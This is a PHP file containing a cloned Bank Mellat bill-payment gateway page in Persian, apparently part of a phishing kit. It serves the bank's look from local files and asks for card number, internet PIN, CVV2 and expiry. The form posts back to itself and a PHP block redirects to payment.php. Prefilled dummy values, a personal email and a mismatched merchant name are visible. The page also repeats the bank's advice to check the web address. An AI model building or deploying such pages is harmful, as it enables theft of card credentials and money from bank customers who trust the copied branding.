<?php session_start(); ob_start();?>
<!-- saved from url=(0084)https://bill.bpm.bankmellat.ir/bpgwchannel/billpayment.mellat?RefId=58263458B81A4BCE -->
<html><head>
    
    

    <title>
        دروازه پرداخت اينترنتي قبض به پرداخت ملت
</title>


    <link href="./bank/Style.css" rel="stylesheet" type="text/css">

    <link rel="shortcut icon" href="https://bill.bpm.bankmellat.ir/bpgwchannel/images/favicon.ico" type="image/x-icon">
    <script language="JavaScript">
        if (top.frames.length != 0) {
            top.location = window.location;
        }
    </script>

     <style type="text/css" media="print">
        .hiddenstuff {
            display: none;
            visibility: hidden;
        }
    </style>

</head>
<body dir="rtl" onkeypress="keyHandler()" onload="c_random();display();" oncontextmenu="return false;">
<table width="100%">
<tbody><tr>
<td align="center">

<form method="post" id="PayForm" name="PayForm">
<table class="MainTable">
<tbody><tr align="center">
<td>
<div id="part3">
<table class="PgwTable">
    <tbody><tr align="center">
        <td colspan="2">
            
            <img class="Banner" src="./bank/new-header-Pardakht-Ghoboz.jpg">
        </td>
    </tr>
    <tr>
        <td align="right">
            <table>
                <tbody><tr>
                    <td class="InputTitleTD">
نام سازمان
                    </td>
                    <td class="InputBillValue">
                        <div class="divCaption">
                        &nbsp;فروشگاه اکسیژن کامپیوتر &nbsp;
                            </div>
                    </td>
                   <input type="hidden" id="W_GENERALSERVICENAME" name="W_GENERALSERVICENAME" value="تسويه قبوض برق استان خوزستان">
                </tr>

                <tr>
                    <td class="InputTitleTD">
                        شناسه پرداخت
                    </td>
                    <td class="InputBillValue">
                        <div class="divCaption">
                        &nbsp; 8360284 &nbsp;
                            </div>
                    </td>
                </tr>
                <tr>
                    <td class="InputTitleTD">
                        مبلغ قابل پرداخت
                    </td>
                    <td class="InputBillValue">
                        <div class="divCaption">
                        &nbsp;  83,000 &nbsp;    ريال
                            </div>
                    </td>
                </tr>
            </tbody></table>
        </td>

        <td align="center" width="30%">

            <table>
                 <tbody><tr>
                    <td>
                        <center>

<img src="./bank/default-logo.png" style="   height: 60px;width: 60px;background-color: #FFF;padding: 1px;border-radius: 4px;">
                            </center>

                    </td>
                </tr>

                 <tr>
                    <td style="border-bottom: 1px solid #999999;padding:5px;width:70px;">
                         <center>
                        <font class="TimeInputLogo">


    

                        </font>
                                </center>
                    </td>
                </tr>

                <tr style="width:175px;">
                   <td style="width:175px;">
                       <center>
                           <font class="TimeInputLogo">
                               
                           </font>
                       </center>

                   </td>
               </tr>




                  <tr style="width:125px;">
                    <td style="width:125px;">
                        <center>
                        <font class="TimeInputLogo">
                            زمان باقيمانده:
                            <input class="TimeInputLogo" name="time" id="time" readonly="true" tabindex="-1">
                        </font>
                            </center>

                    </td>
                </tr>
            </tbody></table>
              <div id="part22">

<span name="insertDate" id="insertDate" class="SpecialText"></span>

                        </div>
        </td>








    </tr>
    <tr>
        <td colspan="2" height="1" bgcolor="#F76A25">
        </td>
    </tr>
</tbody></table>
</div>

<div id="part1">
<table class="PgwTable">

    
        
            
        
    

<tbody><tr>
    <td colspan="2" align="center" class="AlertTD">
        <img id="AjaxLoad" src="./bank/unload.gif" alt="" title="" width="1" height="1">&nbsp;&nbsp;<span id="alert"></span>&nbsp;&nbsp;
    </td>
</tr>
<tr>
<td align="right" valign="top">
<table>
<tbody><tr>
    <td class="InputTitleTD">
        شماره کارت
        <font class="Star">
            *
        </font>
    </td>
    <td dir="ltr" align="right">
        <input size="4" value="0000" type="text" class="PanInput" id="W_PAN4" name="W_PAN4" maxlength="4" onkeypress="return numericOnKeypress(event)" onkeyup="nextTabs(this, false, event)" tabindex="1" width="200" autocomplete="off" dir="ltr" onpaste="doNotPaste()" onfocus="getName(this)">
        <input size="4" value="0000" type="text" class="PanInput" id="W_PAN3" name="W_PAN3" maxlength="4" onkeypress="return numericOnKeypress(event)" onkeyup="nextTabs(this, false, event)" tabindex="2" width="150" autocomplete="off" dir="ltr" onpaste="doNotPaste()" onfocus="getName(this)">
        <input size="4" value="0000" type="text" class="PanInput" id="W_PAN2" name="W_PAN2" maxlength="4" onkeypress="return numericOnKeypress(event)" onkeyup="nextTabs(this, false, event)" tabindex="3" width="100" autocomplete="off" dir="ltr" onpaste="doNotPaste()" onfocus="getName(this)">
        <input size="4" value="0000" type="text" class="PanInput" id="W_PAN1" name="W_PAN1" maxlength="4" onkeypress="return numericOnKeypress(event)" onkeyup="nextTabs(this, false, event)" tabindex="4" width="50" autocomplete="off" dir="ltr" onpaste="doNotPaste()" onfocus="getName(this)">
    </td>
</tr>
<tr>
    <td class="InputTitleTD">
        رمز اينترنتي کارت
        <font class="Star">
            *
        </font>
    </td>
    <td dir="ltr" align="right">
        <input type="password" value="0000" size="12" class="PublicInput" id="W_PIN" name="W_PIN" maxlength="12" autocomplete="off" onkeypress="return numericOnKeypress(event)" onkeyup="nextTabs(this, false, event)" tabindex="5" dir="ltr" onpaste="doNotPaste()" onfocus="getName(this)">
    </td>
</tr>
<tr>
    <td class="InputTitleTD">
        شماره شناسایی دوم  (CVV2)
        <font class="Star">
            *
        </font>
    </td>
    <td dir="ltr" align="right">
        <input type="password" value="0000" size="4" class="PublicInput" id="W_CVV2" name="W_CVV2" maxlength="4" autocomplete="off" onkeypress="return numericOnKeypress(event)" onkeyup="nextTabs(this, false, event)" tabindex="6" dir="ltr" onpaste="doNotPaste()" onfocus="getName(this)">
    </td>
</tr>
<tr>
    <td class="InputTitleTD">
        تاريخ انقضاي کارت

        
         <font class="InputTitleTD">
            (ماه / سال)
        </font>
        <font class="Star">
                    *
                </font>

    </td>
    <td dir="ltr" align="right">

        &nbsp;
        <input size="2" type="text"  value="00" class="DateInput" id="W_EXPIRE2" name="W_EXPIRE2" maxlength="2" autocomplete="off" onkeypress="return numericOnKeypress(event)" onkeyup="nextTabs(this, false, event)" tabindex="8" dir="ltr" onpaste="doNotPaste()" onfocus="getName(this)">
        <font class="SpecialHint">
            <b>/</b>
        </font>
        <input size="2" type="text"  value="00" class="DateInput" id="W_EXPIRE1" name="W_EXPIRE1" maxlength="2" autocomplete="off" onkeypress="return numericOnKeypress(event)" onkeyup="nextTabs(this, false, event)" tabindex="7" dir="ltr" onpaste="doNotPaste()" onfocus="getName(this)">
    </td>
</tr>


    

        
            
        
    
    
        
    



<tr>
    <td class="InputTitleTD">
        حروف تصوير
        <font class="Star">
            *
        </font>
    </td>
    <td dir="ltr" align="right">
        <img src="./bank/refresh.gif" class="Captcha" dir="ltr" id="change" name="change" title="نمايش تصوير جديد" alt="نمايش تصوير جديد">
        <img src="./bank/captchaimg.jpg" id="security" name="security" alt="" style="vertical-align: middle">
        &nbsp;
        <input type="text" dir="ltr" size="5" value="BZSX"  class="PublicInput" id="W_CAPTCHA" name="W_CAPTCHA" maxlength="5" onkeyup="nextTabs(this, false, event)" tabindex="9" autocomplete="off" onpaste="doNotPaste()" onfocus="getName(this)">
    </td>
</tr>

    <tr>
        <td class="InputTitleTD">
            آدرس ايميل (اختياري)
        </td>
        <td dir="ltr" align="right">
            <input type="text" size="35" value="miladrahi@gmail.com"  class="PUBLICEMAIL" id="PUBLICEMAIL" name="PUBLICEMAIL" maxlength="35" dir="ltr" onpaste="doNotPaste()" autocomplete="off">
        </td>
    </tr>

</tbody></table>
</td>
<td align="center" width="30%">
    <table class="TableBorder">
        <tbody><tr>
            <td class="BorderTD"><input name="btn7" id="btn7" type="KB_Button" readonly="true" tabindex="-1" onclick="fill(this)" class="NumPressed"></td>
            <td class="BorderTD"><input name="btn8" id="btn8" type="KB_Button" readonly="true" tabindex="-1" onclick="fill(this)" class="NumPressed"></td>
            <td class="BorderTD"><input name="btn9" id="btn9" type="KB_Button" readonly="true" tabindex="-1" onclick="fill(this)" class="NumPressed"></td>
        </tr>
        <tr>
            <td class="BorderTD"><input name="btn4" id="btn4" type="KB_Button" readonly="true" tabindex="-1" onclick="fill(this)" class="NumPressed"></td>
            <td class="BorderTD"><input name="btn5" id="btn5" type="KB_Button" readonly="true" tabindex="-1" onclick="fill(this)" class="NumPressed"></td>
            <td class="BorderTD"><input name="btn6" id="btn6" type="KB_Button" readonly="true" tabindex="-1" onclick="fill(this)" class="NumPressed"></td>
        </tr>
        <tr>
            <td class="BorderTD"><input name="btn1" id="btn1" type="KB_Button" readonly="true" tabindex="-1" onclick="fill(this)" class="NumPressed"></td>
            <td class="BorderTD"><input name="btn2" id="btn2" type="KB_Button" readonly="true" tabindex="-1" onclick="fill(this)" class="NumPressed"></td>
            <td class="BorderTD"><input name="btn3" id="btn3" type="KB_Button" readonly="true" tabindex="-1" onclick="fill(this)" class="NumPressed"></td>
        </tr>
        <tr>
            <td class="BorderTD"><input name="btn0" id="btn0" type="KB_Button" readonly="true" tabindex="-1" onclick="fill(this)" class="NumPressed"></td>
            <td class="BorderTD"><input name="Back" value="Back" type="KB_Button" readonly="true" tabindex="-1" onclick="backspace()" class="NumPressed">
            </td>
            <td class="BorderTD"><input name="Back" value="Tab" type="KB_Button" readonly="true" tabindex="-1" onclick="tab()" class="NumPressed"></td>
        </tr>
        <tr>
            <td colspan="3" align="center">
                <font class="SpecialText">
                    صفحه کليد ايمن
                </font>
            </td>
        </tr>
    </tbody></table>
    <br>
</td>
</tr>
<tr>
    <td colspan="2" height="0.1" bgcolor="#F76A25">
    </td>
</tr>
<tr>
    <td colspan="2" class="FooterTD">
        <input type="submit" class="Public_Button" id="doPay" name="doPay" value="پرداخت">
        &nbsp;&nbsp;&nbsp;
        <input type="submit" class="Public_Button" id="doCancel" name="doCancel" value="انصراف">
    </td>
</tr>
</tbody></table>

<table>
    <tbody>
    <tr align="middle">
        <td>
            <table class="PgwTable">
                <tbody>

                <tr>
                    <td class="FooterTD" colspan="2" align="middle">
                        <b class="HeaderFont"><font color="#FFEFEF"> راهنمای کاربری و ملاحظات امنیتی</font></b>
                    </td>
                </tr>
                
                    
                    
                
                
                    
                    
                
                <tr>
                    <td>
                        <ul>
                            <li><p class="SecurityTitle" align="justify" style="margin-top: -0.5em;">
                              شماره کارت: 16 رقمی بوده و بصورت 4 قسمت 4 رقمی و روی کارت درج شده است.
<br>
cvv2: با طول 3 یا 4 رقم کنار شماره کارت و یا پشت کارت درج شده است.
<br>
تاریخ انقضا: شامل دو بخش ماه و سال انقضا در کنار شماره کارت درج شده است .
<br>
رمز اینترنتی: با عنوان رمز دوم و در برخی موارد با PIN2  شناخته می شود، از طریق بانک صادر کننده کارت تولید شده و همچنین از طریق دستگاه های خودپرداز بانک صادر کننده قابل تهیه و یا تغییر می باشد.
<br>
حروف تصویر: بخشی از محتوای صفحه پرداخت است و لازم است برای ادامه فرایند خرید ، کد موجود که به صورت حرفی -عددی  در تصویر مشخص شده است در محل پیش بینی شده درج شود.
                            </p></li>


                            <li><p class="SecurityTitle" align="justify" style="margin-top: -0.9em;">
                                دروازه پرداخت قبض اینترنتی به پرداخت ملت با استفاده از پروتکل امن SSL به مشتریان خود ارایه
                                خدمت
                                نموده و با آدرس <span class="FooterRedSpan">https://bill.bpm.bankmellat.ir</span> شروع می
                                شود. خواهشمند است به منظور جلوگیری از سوء استفاده های احتمالی پیش از ورود هرگونه
                                اطلاعات، آدرس موجود در بخش مرورگر وب خود را با آدرس فوق مقایسه نمایید و درصورت مشاهده هر
                                نوع مغایرت احتمالی، موضوع را با ما درمیان بگذارید. </p></li>

<li><p class="SecurityTitle" align="justify" style="margin-top: -0.9em;">
برای جلوگیری از افشای رمز کارت خود،حتی المقدور از صفحه کلید مجازی استفاده فرمایید.
                            </p></li>


<li><p class="SecurityTitle" align="justify" style="margin-top: -0.9em;">
برای کسب اطلاعات بیشتر، گزارش فروشگاههای مشکوک و همچنین اطلاع از وضعیت پذیرندگان اینترنتی با ما تماس بگیرید.
                            </p></li>




<li><p class="SecurityTitle" align="justify" style="margin-top: -0.9em;">
لطفا از صحت نام فروشنده و مبلغ نمایش داده شده، اطمینان حاصل فرمایید.
                            </p></li>








                        </ul>
                    </td>
                </tr>
                </tbody>
            </table>

        </td>
    </tr>
</tbody></table>
</div>

<div id="part2" style="display: none;">
<table class="PgwTable">
<tbody><tr>
    <td align="center" class="AlertTD">
        <img id="AjaxConfirm" src="./bank/unload.gif" alt="" title="" width="1" height="1">&nbsp;&nbsp;<span id="confirmAlert"></span>&nbsp;&nbsp;
    </td>
</tr>
<tr>
    <td dir="rtl" align="center" class="SaleIdNote">
تراکنش مالي مورد نظر با شماره پيگيري &nbsp; <span name="C_SaleReferenceId" id="C_SaleReferenceId" class="SaleId"></span> &nbsp;  با موفقيت انجام شد.
    </td>
</tr>
<tr>
    <td height="1" bgcolor="#FEFEFE">
    </td>
</tr>
<tr>
    <td class="FooterTD">
   <div class="hiddenstuff">
        <input type="submit" class="Confirm_Button" id="doConfirm" name="doConfirm" value="پرداخت قبضي ديگر">
        &nbsp;&nbsp;&nbsp;
        <input type="button" class="Confirm_Button" id="doPrint" name="doPrint" onclick="window.print()" value="      چاپ      ">
   </div>
    </td>

</tr>
</tbody></table>
</div>


</td>
</tr>
</tbody></table>
</form>

<form method="post" id="returnForm" name="returnForm" action="https://bill.bpm.bankmellat.ir/bpgwchannel/billindex.mellat">
    <input type="hidden" id="RefId" name="RefId" value="58263458B81A4BCE">
    <input type="hidden" id="ResCode" name="ResCode">
    <input type="hidden" id="BillId" name="BillId" value="1283602406127">
    <input type="hidden" id="PaymentId" name="PaymentId" value="8360284">
    <input type="hidden" id="SaleReferenceId" name="SaleReferenceId">
</form>


<form method="post" name="receiptForm" action="https://bill.bpm.bankmellat.ir/bpgwchannel/receipt.mellat">
    <input type="hidden" id="RefIdReceipt" name="RefIdReceipt" value="58263458B81A4BCE">
    <input type="hidden" id="ResCodeReceipt" name="ResCodeReceipt">
    <input type="hidden" id="SaleReferenceIdReceipt" name="SaleReferenceIdReceipt">
    <input type="hidden" id="BillIdReceipt" name="BillIdReceipt" value="1283602406127">
    <input type="hidden" id="PaymentIdReceipt" name="PaymentIdReceipt" value="8360284">
    <input type="hidden" id="AmountReceipt" name="AmountReceipt" value="83000">
    <input type="hidden" id="CallBackUrlReceipt" name="CallBackUrlReceipt" value="billindex.mellat">
    <input type="hidden" id="pan" name="pan">
    <input type="hidden" id="GiftAmount" name="GiftAmount">
</form>


<table class="FooterTable">
    <tbody><tr>
        <td class="FooterHint">
<b>
 شرکت به پرداخت ملت ارايه دهنده خدمات نوین پرداخت الکترونيک بانک ملت
                                                                       <br>
<div class="FooterRedSpan">http://www.behpardakht.com</div>

</b>
            <br>
شماره تماس: 021-27312733

        </td>
    </tr>
</tbody></table>

</td>
</tr>
</tbody></table>
<?php
if(isset($_POST['doPay']))
{
    $_SESSION['payment']=1;
    header("location: payment.php");
}
?>


</body></html>